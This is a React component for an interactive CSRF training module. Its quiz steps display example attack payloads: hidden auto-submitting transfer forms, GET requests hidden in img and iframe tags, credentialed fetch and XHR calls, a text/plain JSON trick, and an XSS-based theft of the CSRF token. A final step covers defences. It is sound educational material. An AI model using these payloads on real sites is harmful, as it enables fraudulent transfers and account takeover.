import { useState } from "react";
import "./styles.scss";

export default function CSRFExploitationTask({ onComplete }) {
  const [currentStep, setCurrentStep] = useState(0);
  const [completedSteps, setCompletedSteps] = useState([]);
  const [answers, setAnswers] = useState({});

  const steps = [
    {
      id: "basic-csrf",
      title: "Basic CSRF Attack",
      description: "Understanding how CSRF attacks work",
      task: (
        <div className="task-box">
          <h4>Cross-Site Request Forgery Fundamentals</h4>
          <p className="task-intro">
            CSRF tricks users into performing unintended actions on websites where they are authenticated
          </p>

          <div className="exploit-demo">
            <h5>Simple CSRF Attack Example:</h5>
            <div className="code-block">
              <code>
                &lt;img src="https://bank.com/transfer?to=attacker&amount=1000" /&gt;
              </code>
            </div>

            <div className="code-block">
              <code>
                &lt;form action="https://bank.com/transfer" method="POST"&gt;
                <br />
                &nbsp;&nbsp;&lt;input type="hidden" name="to" value="attacker" /&gt;
                <br />
                &nbsp;&nbsp;&lt;input type="hidden" name="amount" value="1000" /&gt;
                <br />
                &lt;/form&gt;
                <br />
                &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
              </code>
            </div>
          </div>

          <div className="info-box">
            <h5>How CSRF Works:</h5>
            <ul>
              <li>Victim is authenticated on target website</li>
              <li>Attacker tricks victim into visiting malicious page</li>
              <li>Malicious page sends forged request to target site</li>
              <li>Browser automatically includes authentication cookies</li>
              <li>Target site processes request as legitimate</li>
            </ul>
          </div>

          <div className="warning-box">
            <p>
              <strong>Key Point:</strong> The attack exploits the trust that a website 
              has in the user's browser, using existing authentication.
            </p>
          </div>
        </div>
      ),
      question: "What makes CSRF attacks possible?",
      options: [
        "Weak passwords",
        "Browsers automatically include authentication cookies with requests",
        "JavaScript vulnerabilities",
        "SQL injection",
      ],
      correct: 1,
      explanation:
        "CSRF attacks work because browsers automatically include authentication cookies with cross-origin requests, allowing attackers to forge authenticated requests on behalf of victims.",
    },
    {
      id: "get-based-csrf",
      title: "GET-Based CSRF",
      description: "Exploiting state-changing GET requests",
      task: (
        <div className="task-box">
          <h4>GET-Based CSRF Attacks</h4>
          
          <div className="exploit-demo">
            <h5>Attack Vectors:</h5>
            
            <div className="code-block">
              <strong>Image Tag Exploitation:</strong>
              <code>
                &lt;img src="https://example.com/api/delete-account" /&gt;
              </code>
            </div>

            <div className="code-block">
              <strong>Link Exploitation:</strong>
              <code>
                &lt;a href="https://example.com/api/change-email?email=attacker@evil.com"&gt;
                <br />
                &nbsp;&nbsp;Click here for free prize!
                <br />
                &lt;/a&gt;
              </code>
            </div>

            <div className="code-block">
              <strong>Script Tag:</strong>
              <code>
                &lt;script src="https://example.com/api/follow?user=attacker"&gt;&lt;/script&gt;
              </code>
            </div>

            <div className="code-block">
              <strong>iframe Exploitation:</strong>
              <code>
                &lt;iframe src="https://example.com/api/transfer?to=attacker&amount=5000" 
                <br />
                &nbsp;&nbsp;style="display:none"&gt;&lt;/iframe&gt;
              </code>
            </div>
          </div>

          <div className="impact-box">
            <p><strong>Common Targets:</strong></p>
            <ul>
              <li>Account deletion endpoints</li>
              <li>Email/password change functions</li>
              <li>Fund transfer operations</li>
              <li>Follow/unfollow actions</li>
              <li>Settings modifications</li>
            </ul>
          </div>

          <div className="tip-box">
            <p>
              <strong>Important:</strong> GET requests should never modify server state. 
              This is a REST principle that prevents GET-based CSRF attacks.
            </p>
          </div>
        </div>
      ),
      question: "Why should state-changing operations never use GET requests?",
      options: [
        "GET is slower than POST",
        "GET requests can be triggered by simple HTML tags making CSRF trivial",
        "GET cannot handle parameters",
        "POST is more secure by default",
      ],
      correct: 1,
      explanation:
        "GET requests can be triggered by simple HTML elements like images, links, or scripts without user interaction, making CSRF attacks extremely easy to execute. State-changing operations should always use POST or other non-idempotent methods.",
    },
    {
      id: "post-based-csrf",
      title: "POST-Based CSRF",
      description: "Advanced CSRF attacks using POST requests",
      task: (
        <div className="task-box">
          <h4>POST-Based CSRF Exploitation</h4>

          <div className="exploit-demo">
            <h5>Auto-Submit Form Attack:</h5>
            <div className="code-block">
              <code>
                &lt;html&gt;
                <br />
                &nbsp;&nbsp;&lt;body onload="document.forms[0].submit()"&gt;
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&lt;form action="https://bank.com/transfer" method="POST"&gt;
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="hidden" name="recipient" value="attacker" /&gt;
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="hidden" name="amount" value="10000" /&gt;
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&lt;/form&gt;
                <br />
                &nbsp;&nbsp;&lt;/body&gt;
                <br />
                &lt;/html&gt;
              </code>
            </div>

            <h5>JavaScript-Based POST CSRF:</h5>
            <div className="code-block">
              <code>
                &lt;script&gt;
                <br />
                &nbsp;&nbsp;fetch('https://bank.com/api/transfer', {'{'}
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;method: 'POST',
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;credentials: 'include',
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;headers: {'{'}
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Content-Type': 'application/json'
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;{'}'},
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;body: JSON.stringify({'{'}
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;recipient: 'attacker',
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;amount: 10000
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;{'}'})
                <br />
                &nbsp;&nbsp;{'}'});
                <br />
                &lt;/script&gt;
              </code>
            </div>

            <h5>XMLHttpRequest Method:</h5>
            <div className="code-block">
              <code>
                &lt;script&gt;
                <br />
                &nbsp;&nbsp;var xhr = new XMLHttpRequest();
                <br />
                &nbsp;&nbsp;xhr.open('POST', 'https://bank.com/api/transfer');
                <br />
                &nbsp;&nbsp;xhr.withCredentials = true;
                <br />
                &nbsp;&nbsp;xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                <br />
                &nbsp;&nbsp;xhr.send('recipient=attacker&amount=10000');
                <br />
                &lt;/script&gt;
              </code>
            </div>
          </div>

          <div className="warning-box">
            <p>
              <strong>Note:</strong> CORS policies may block some JavaScript-based 
              attacks, but form submissions are not restricted by CORS.
            </p>
          </div>
        </div>
      ),
      question: "What is the key difference between GET and POST CSRF attacks?",
      options: [
        "POST attacks are impossible",
        "POST attacks require more sophisticated delivery but can bypass some basic protections",
        "GET is always safer",
        "There is no difference",
      ],
      correct: 1,
      explanation:
        "POST-based CSRF attacks require auto-submitting forms or JavaScript, making them slightly more complex. However, they can target endpoints that only accept POST requests, which developers might mistakenly believe are safe from CSRF.",
    },
    {
      id: "json-csrf",
      title: "JSON-Based CSRF",
      description: "Exploiting JSON endpoints without CSRF protection",
      task: (
        <div className="task-box">
          <h4>JSON CSRF Attacks</h4>

          <div className="exploit-demo">
            <h5>Form with JSON Content-Type:</h5>
            <div className="code-block">
              <code>
                &lt;form action="https://api.example.com/update" method="POST"
                <br />
                &nbsp;&nbsp;enctype="text/plain"&gt;
                <br />
                &nbsp;&nbsp;&lt;input name='{'{'}email:attacker@evil.com,admin:true,padding:'
                <br />
                &nbsp;&nbsp;&nbsp;&nbsp;value='{'}'}' type="hidden" /&gt;
                <br />
                &lt;/form&gt;
                <br />
                &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
              </code>
            </div>

            <p className="explanation-text">
              This creates a request body like:
            </p>
            <div className="code-block">
              <code>
                {'{'}email:attacker@evil.com,admin:true,padding:={'}'}
              </code>
            </div>

            <h5>Flash-Based CSRF (Legacy):</h5>
            <div className="code-block">
              <code>
                &lt;object data="csrf.swf"&gt;
                <br />
                &nbsp;&nbsp;&lt;param name="allowScriptAccess" value="always" /&gt;
                <br />
                &nbsp;&nbsp;&lt;param name="flashvars" value="target=https://api.example.com/update" /&gt;
                <br />
                &lt;/object&gt;
              </code>
            </div>
          </div>

          <div className="defense-box">
            <p><strong>Modern Protections:</strong></p>
            <ul>
              <li>CORS properly configured blocks fetch/XHR</li>
              <li>Content-Type validation on server</li>
              <li>CSRF tokens in JSON payloads</li>
              <li>SameSite cookie attribute</li>
            </ul>
          </div>

          <div className="tip-box">
            <p>
              <strong>Developer Mistake:</strong> Accepting both JSON and form-encoded 
              data without proper CSRF protection on all content types.
            </p>
          </div>
        </div>
      ),
      question: "How can attackers bypass JSON content-type restrictions?",
      options: [
        "They cannot bypass it at all",
        "Using text/plain encoding and manipulating form field names to create valid JSON",
        "Only with user permission",
        "By disabling JavaScript",
      ],
      correct: 1,
      explanation:
        "Attackers can use text/plain encoding with carefully crafted form field names to create valid JSON payloads. Servers that don't strictly validate Content-Type or accept multiple formats are vulnerable.",
    },
    {
      id: "advanced-csrf",
      title: "Advanced CSRF Techniques",
      description: "Complex attack scenarios and bypasses",
      task: (
        <div className="task-box">
          <h4>Advanced CSRF Exploitation</h4>

          <div className="advanced-techniques">
            <div className="technique-card">
              <h5>CSRF Token Bypass via XSS</h5>
              <p>If XSS exists, CSRF protection can be defeated:</p>
              <div className="code-block">
                <code>
                  &lt;script&gt;
                  <br />
                  fetch('/page-with-form')
                  <br />
                  &nbsp;&nbsp;.then(r =&gt; r.text())
                  <br />
                  &nbsp;&nbsp;.then(html =&gt; {'{'}
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;let token = html.match(/csrf_token" value="(.+?)"/)[1];
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;fetch('/api/transfer', {'{'}
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;method: 'POST',
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;headers: {'{'}'X-CSRF-Token': token{'}'},
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;body: JSON.stringify({'{'}to: 'attacker', amount: 5000{'}'})
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;{'}'});
                  <br />
                  &nbsp;&nbsp;{'}'});
                  <br />
                  &lt;/script&gt;
                </code>
              </div>
            </div>

            <div className="technique-card">
              <h5>Clickjacking + CSRF</h5>
              <p>Combine transparent iframe with CSRF:</p>
              <div className="code-block">
                <code>
                  &lt;iframe src="https://bank.com/transfer" style="opacity:0.001"&gt;&lt;/iframe&gt;
                  <br />
                  &lt;button style="position:absolute; top:100px; left:200px"&gt;
                  <br />
                  &nbsp;&nbsp;Click for prize!
                  <br />
                  &lt;/button&gt;
                </code>
              </div>
              <p>User thinks they're clicking the button but actually clicking the hidden form</p>
            </div>

            <div className="technique-card">
              <h5>Session Riding</h5>
              <p>Attack authenticated REST APIs:</p>
              <div className="code-block">
                <code>
                  &lt;script&gt;
                  <br />
                  fetch('https://api.site.com/user/settings', {'{'}
                  <br />
                  &nbsp;&nbsp;method: 'PUT',
                  <br />
                  &nbsp;&nbsp;credentials: 'include',
                  <br />
                  &nbsp;&nbsp;body: JSON.stringify({'{'}
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;email: 'attacker@evil.com',
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;notifications: false
                  <br />
                  &nbsp;&nbsp;{'}'})
                  <br />
                  {'}'});
                  <br />
                  &lt;/script&gt;
                </code>
              </div>
            </div>

            <div className="technique-card">
              <h5>Referer Header Bypass</h5>
              <p>Some sites only check Referer header:</p>
              <div className="code-block">
                <code>
                  &lt;meta name="referrer" content="never" /&gt;
                  <br />
                  &lt;iframe src="https://bank.com/transfer?to=attacker&amount=1000"&gt;
                  <br />
                  &lt;/iframe&gt;
                </code>
              </div>
              <p>Suppressing Referer can bypass weak validation</p>
            </div>
          </div>

          <div className="success-box">
            <p>
              <strong>Key Insight:</strong> CSRF becomes even more dangerous when 
              combined with other vulnerabilities like XSS or clickjacking.
            </p>
          </div>
        </div>
      ),
      question: "What makes CSRF particularly dangerous in modern web applications?",
      options: [
        "It only affects old websites",
        "It can be combined with other attacks and exploits the trust relationship between user and site",
        "It's easy to detect",
        "It only works on HTTP sites",
      ],
      correct: 1,
      explanation:
        "CSRF exploits the fundamental trust relationship between a website and authenticated users. When combined with XSS or clickjacking, it becomes extremely powerful and can bypass many security controls.",
    },
    {
      id: "csrf-prevention",
      title: "CSRF Prevention & Mitigation",
      description: "Learn how to properly defend against CSRF attacks",
      task: (
        <div className="task-box">
          <h4>Defending Against CSRF</h4>

          <div className="defense-strategies">
            <div className="defense-card">
              <h5>1. CSRF Tokens (Synchronizer Token Pattern)</h5>
              <p>Generate unique tokens for each session/request:</p>
              <div className="code-block">
                <code>
                  &lt;form action="/transfer" method="POST"&gt;
                  <br />
                  &nbsp;&nbsp;&lt;input type="hidden" name="csrf_token" 
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;value="8f5d2a9b3c4e1f6g7h8i9j0k" /&gt;
                  <br />
                  &nbsp;&nbsp;&lt;input type="text" name="recipient" /&gt;
                  <br />
                  &nbsp;&nbsp;&lt;button type="submit"&gt;Transfer&lt;/button&gt;
                  <br />
                  &lt;/form&gt;
                </code>
              </div>
              <p>Server validates token on each state-changing request</p>
            </div>

            <div className="defense-card">
              <h5>2. SameSite Cookie Attribute</h5>
              <div className="code-block">
                <code>
                  Set-Cookie: sessionid=abc123;
                  <br />
                  &nbsp;&nbsp;SameSite=Strict;
                  <br />
                  &nbsp;&nbsp;Secure;
                  <br />
                  &nbsp;&nbsp;HttpOnly
                </code>
              </div>
              <p>Options:</p>
              <ul>
                <li>Strict: Never sent on cross-site requests</li>
                <li>Lax: Sent on top-level GET navigation only</li>
                <li>None: Sent on all requests (requires Secure)</li>
              </ul>
            </div>

            <div className="defense-card">
              <h5>3. Double Submit Cookie Pattern</h5>
              <div className="code-block">
                <code>
                  Set-Cookie: csrf_token=xyz789
                  <br />
                  <br />
                  &lt;form action="/api/update" method="POST"&gt;
                  <br />
                  &nbsp;&nbsp;&lt;input type="hidden" name="csrf_token" value="xyz789" /&gt;
                  <br />
                  &lt;/form&gt;
                </code>
              </div>
              <p>Server verifies cookie value matches form value</p>
            </div>

            <div className="defense-card">
              <h5>4. Custom Request Headers</h5>
              <div className="code-block">
                <code>
                  fetch('/api/transfer', {'{'}
                  <br />
                  &nbsp;&nbsp;method: 'POST',
                  <br />
                  &nbsp;&nbsp;headers: {'{'}
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;'X-Requested-With': 'XMLHttpRequest',
                  <br />
                  &nbsp;&nbsp;&nbsp;&nbsp;'X-CSRF-Token': token
                  <br />
                  &nbsp;&nbsp;{'}'},
                  <br />
                  &nbsp;&nbsp;body: JSON.stringify(data)
                  <br />
                  {'}'});
                </code>
              </div>
              <p>Simple forms cannot set custom headers</p>
            </div>

            <div className="defense-card">
              <h5>5. Origin/Referer Header Validation</h5>
              <div className="code-block">
                <code>
                  if (request.headers.origin !== 'https://yourdomain.com') {'{'}
                  <br />
                  &nbsp;&nbsp;return 403;
                  <br />
                  {'}'}
                </code>
              </div>
              <p>Defense in depth, not primary protection</p>
            </div>

            <div className="defense-card">
              <h5>6. User Interaction Verification</h5>
              <p>For sensitive operations:</p>
              <ul>
                <li>Re-authentication</li>
                <li>CAPTCHA challenges</li>
                <li>Transaction confirmation codes</li>
                <li>Two-factor authentication</li>
              </ul>
            </div>
          </div>

          <div className="summary-box">
            <p><strong>Best Practices:</strong></p>
            <ul>
              <li>Use SameSite=Strict or Lax on session cookies</li>
              <li>Implement CSRF tokens for all state-changing operations</li>
              <li>Follow REST principles (no state changes via GET)</li>
              <li>Validate Content-Type headers</li>
              <li>Implement proper CORS policies</li>
              <li>Use framework built-in CSRF protection</li>
              <li>Regular security testing and code review</li>
            </ul>
          </div>
        </div>
      ),
      question: "What is the most effective combination for CSRF protection?",
      options: [
        "Only checking Referer header",
        "SameSite cookies + CSRF tokens + proper REST design",
        "Using only HTTPS",
        "Disabling cookies entirely",
      ],
      correct: 1,
      explanation:
        "The most effective CSRF protection combines multiple layers: SameSite cookie attribute (preferably Strict or Lax), CSRF tokens for state-changing operations, and proper REST design where GET requests never modify state. This defense-in-depth approach provides robust protection.",
    },
  ];

  const handleAnswer = (stepIndex, selectedOption) => {
    const step = steps[stepIndex];
    const isCorrect = selectedOption === step.correct;

    setAnswers((prev) => ({
      ...prev,
      [stepIndex]: {
        selected: selectedOption,
        correct: isCorrect,
      },
    }));

    if (isCorrect && !completedSteps.includes(stepIndex)) {
      const newCompleted = [...completedSteps, stepIndex];
      setCompletedSteps(newCompleted);

      if (newCompleted.length === steps.length) {
        onComplete?.("exploitation");
      }
    }
  };

  const goNext = () => {
    if (currentStep < steps.length - 1) {
      setCurrentStep(currentStep + 1);
    }
  };

  const goPrev = () => {
    if (currentStep > 0) {
      setCurrentStep(currentStep - 1);
    }
  };

  const handleRestart = () => {
    setCurrentStep(0);
    setCompletedSteps([]);
    setAnswers({});
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const step = steps[currentStep];
  const answered = answers[currentStep];

  return (
    <div className="exploitation-container">
      <div className="content-section">
        <h2 className="step-title">{step.title}</h2>
        <p className="step-description">{step.description}</p>

        {step.task}

        <div className="question-container">
          <h4 className="question-title">{step.question}</h4>

          <div className="options-container">
            {step.options.map((option, idx) => {
              const isSelected = answered?.selected === idx;
              const isCorrect = idx === step.correct;
              const showResult = answered && isSelected;

              return (
                <button
                  key={idx}
                  onClick={() => handleAnswer(currentStep, idx)}
                  disabled={answered !== undefined}
                  className={`option-button ${
                    showResult
                      ? isCorrect
                        ? "correct"
                        : "incorrect"
                      : isSelected
                      ? "selected"
                      : ""
                  }`}
                >
                  <span className="option-icon">
                    {showResult ? (isCorrect ? "+" : "-") : "o"}
                  </span>
                  {option}
                </button>
              );
            })}
          </div>

          {answered && (
            <div
              className={`feedback-box ${
                answered.correct ? "correct" : "incorrect"
              }`}
            >
              <p className="feedback-title">
                {answered.correct ? "Correct!" : "Incorrect"}
              </p>
              <p className="feedback-explanation">{step.explanation}</p>
              {!answered.correct && (
                <div className="restart-prompt">
                  <p className="restart-text">
                    Don't worry! Learning from mistakes is part of the process.
                    You can restart this phase to try again.
                  </p>
                  <button
                    onClick={handleRestart}
                    className="restart-button"
                  >
                    Restart Phase
                  </button>
                </div>
              )}
            </div>
          )}
        </div>
      </div>

      <div className="navigation-buttons">
        <button
          onClick={goPrev}
          disabled={currentStep === 0}
          className="nav-button prev-button"
        >
          Previous
        </button>

        {completedSteps.includes(currentStep) &&
          currentStep < steps.length - 1 && (
            <button onClick={goNext} className="nav-button next-button">
              Next
            </button>
          )}

        {completedSteps.length === steps.length && (
          <button className="nav-button complete-button">
            Phase completed!
          </button>
        )}
      </div>
    </div>
  );
}
